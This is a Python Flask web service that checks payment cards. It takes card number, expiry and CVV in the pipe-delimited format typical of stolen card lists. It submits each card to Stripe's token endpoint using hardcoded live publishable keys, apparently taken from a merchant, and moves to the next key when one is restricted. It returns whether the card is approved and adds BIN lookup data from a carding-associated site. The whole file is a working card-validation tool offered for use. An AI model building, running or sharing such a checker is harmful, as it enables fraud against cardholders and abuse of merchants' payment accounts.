from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def full_stripe_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        # Try multiple Stripe keys
        stripe_keys = [
            'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy',
            'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy',
        ]
        
        for stripe_key in stripe_keys:
            stripe_data = {
                'card[number]': cc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'card[cvc]': cvv,
                'key': stripe_key
            }
            
            stripe_response = session.post('https://api.stripe.com/v1/tokens', data=stripe_data, timeout=15)
            
            # Success - Card accepted
            if stripe_response.status_code == 200:
                return {"status": "Approved", "response": "Card accepted", "decline_type": "none"}
            
            # Card declined
            elif stripe_response.status_code == 402:
                error = stripe_response.json().get('error', {})
                return {
                    "status": "Declined",
                    "response": error.get('message', 'Card declined'),
                    "decline_type": error.get('code', 'card_decline')
                }
            
            # Invalid card format
            elif stripe_response.status_code == 400:
                error = stripe_response.json().get('error', {})
                # Check if it's a key restriction issue
                if 'unsupported' in error.get('message', '').lower() or 'surface' in error.get('message', '').lower():
                    continue  # Try next key
                return {
                    "status": "Declined",
                    "response": error.get('message', 'Invalid card'),
                    "decline_type": error.get('code', 'invalid_card')
                }
        
        return {"status": "Declined", "response": "Card validation failed", "decline_type": "process_error"}
    
    except Exception as e:
        return {"status": "Declined", "response": str(e), "decline_type": "process_error"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

@app.route('/st', methods=['GET'])
def check_card_st():
    card_str = request.args.get('card')
    
    if not card_str:
        return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

    cc, mm, yy, cvv = match.groups()
    check_result = full_stripe_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])

    final_result = {
        "status": check_result["status"],
        "response": check_result["response"],
        "decline_type": check_result["decline_type"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'), "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'), "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    }
    return jsonify(final_result)

@app.route('/check', methods=['GET'])
def check_card():
    return check_card_st()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
